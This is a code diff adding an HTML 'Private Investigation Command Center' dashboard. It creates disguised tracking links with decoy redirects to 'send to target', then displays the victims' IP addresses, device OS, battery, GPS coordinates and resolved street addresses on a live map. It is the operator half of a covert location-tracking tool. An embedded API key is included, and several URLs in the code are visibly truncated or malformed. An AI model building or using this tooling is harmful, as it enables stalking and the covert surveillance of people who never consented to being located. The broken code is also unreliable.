@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Private Analyst Dashboard</title>
+    <script src="https://jsdelivr.net"></script>
+    <!-- Leaflet.js CSS Maps Map Plugin -->
+    <link rel="stylesheet" href="https://unpkg.com" />
+    <script src="https://unpkg.com"></script>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #121212; color: #fff; margin: 20px; }
+        .box { background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #333; }
+        input, button { padding: 10px; margin: 5px 0; width: 100%; border-radius: 4px; border: 1px solid #444; background: #2a2a2a; color: #fff; box-sizing: border-box; }
+        button { background: #0070f3; cursor: pointer; font-weight: bold; border: none; }
+        button:hover { background: #0051b3; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; font-size: 14px; }
+        th { background: #252525; }
+        #map { height: 400px; width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid #444; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <h1>🚨 Private Investigation Command Center</h1>
+
+    <!-- AUTHENTICATION FORM -->
+    <div id="auth-section" class="box">
+        <h3>Analyst Verification Secured</h3>
+        <input type="email" id="email" placeholder="Analyst Email Address">
+        <input type="password" id="password" placeholder="Encryption Key / Password">
+        <button onclick="login()">Access Secure Console</button>
+    </div>
+
+    <!-- MAIN APP SCREEN -->
+    <div id="main-section" class="hidden">
+        <!-- LINK CREATOR -->
+        <div class="box">
+            <h3>Generate New Monitored Link</h3>
+            <input type="text" id="token" placeholder="Unique Token Slug (e.g., cat-video-7)">
+            <input type="url" id="dest" placeholder="Decoy Redirect URL (e.g., https://youtube.com...)">
+            <button onclick="createLink()">Generate Ingestion Anchor</button>
+            <p id="output-link" style="color: #00ff88; font-family: monospace; font-weight: bold;"></p>
+        </div>
+
+        <!-- RECENT ACTIVITY LOGS -->
+        <div class="box">
+            <h3>Intercepted Device Logs</h3>
+            <button onclick="fetchLogs()">🔄 Refresh Live Logs</button>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Token</th>
+                        <th>IP Address</th>
+                        <th>OS Device</th>
+                        <th>Battery</th>
+                        <th>Coordinates (Lat, Lon)</th>
+                        <th>Resolved Physical Address</th>
+                    </tr>
+                </thead>
+                <tbody id="log-table-body">
+                    <!-- Logs dynamically dump here -->
+                </tbody>
+            </table>
+        </div>
+
+        <!-- VISUAL MAP TRACKER -->
+        <div class="box">
+            <h3>Live GPS Mapping Environment</h3>
+            <div id="map"></div>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURATION LAYER - Linked to your active Supabase Instance
+        const SUPABASE_URL = "https://supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InloZXJuYW53b3phYnBtYW5veWlmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUwNzg4OTcsImV4cCI6MjEwMDY1NDg5N30.YwMaRYcZkeGPTySRs34d7Cg0jr4MGR71WHkCQGkv6FA";
+        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        let map, marker;
+
+        function initMap(lat = 0, lon = 0, zoom = 2) {
+            if (map) {
+                map.setView([lat, lon], zoom);
+                return;
+            }
+            map = L.map('map').setView([lat, lon], zoom);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        }
+
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
+
+            if (error) {
+                alert("Access Denied: " + error.message);
+            } else {
+                document.getElementById('auth-section').classList.add('hidden');
+                document.getElementById('main-section').classList.remove('hidden');
+                initMap();
+                fetchLogs();
+            }
+        }
+
+        async function createLink() {
+            const token = document.getElementById('token').value;
+            const destination_url = document.getElementById('dest').value;
+
+            const { error } = await _supabase.from('tracking_links').insert([{ token, destination_url }]);
+            if (error) {
+                alert("Creation Error: " + error.message);
+            } else {
+                const currentOrigin = window.location.origin;
+                document.getElementById('output-link').innerText = `Send this link to target: ${currentOrigin}/target.html?c=${token}`;
+            }
+        }
+
+        async function getStreetAddress(lat, lon) {
+            if (!lat || !lon) return "No GPS Data Available";
+            try {
+                const res = await fetch(`https://openstreetmap.org{lat}&lon=${lon}`);
+                const data = await res.json();
+                return data.display_name || "Address structural index failure";
+            } catch (e) {
+                return "Address API offline";
+            }
+        }
+
+        async function focusTargetOnMap(lat, lon, label) {
+            initMap(lat, lon, 16);
+            if (marker) map.removeLayer(marker);
+            marker = L.marker([lat, lon]).addTo(map).bindPopup(label).openPopup();
+        }
+
+        async function fetchLogs() {
+            const { data: logs, error } = await _supabase.from('access_logs').select('*').order('timestamp', { ascending: false });
+            if (error) return;
+
+            const tbody = document.getElementById('log-table-body');
+            tbody.innerHTML = "";
+
+            for (let log of logs) {
+                const tr = document.createElement('tr');
+                const hasGPS = log.gps_latitude && log.gps_longitude;
+                
+                const coordsText = hasGPS ? `${log.gps_latitude}, ${log.gps_longitude}` : "N/A (Blocked)";
+                const addressText = hasGPS ? await getStreetAddress(log.gps_latitude, log.gps_longitude) : "N/A";
+
+                tr.innerHTML = `
+                    <td><b>${log.associated_token}</b></td>
+                    <td>${log.public_ip}</td>
+                    <td>${log.device_os}</td>
+                    <td>${log.battery_charge}</td>
+                    <td>${coordsText}</td>
+                    <td style="color: #64b5f6; font-size:12px;">${addressText}</td>
+                `;
+
+                if (hasGPS) {
+                    tr.style.cursor = "pointer";
+                    tr.title = "Click to visually map this target";
+                    tr.onclick = () => focusTargetOnMap(Number(log.gps_latitude), Number(log.gps_longitude), `Target: ${log.associated_token}<br>${log.public_ip}`);
+                }
+
+                tbody.appendChild(tr);
+            }
+        }
+    </script>
+</body>
+</html>
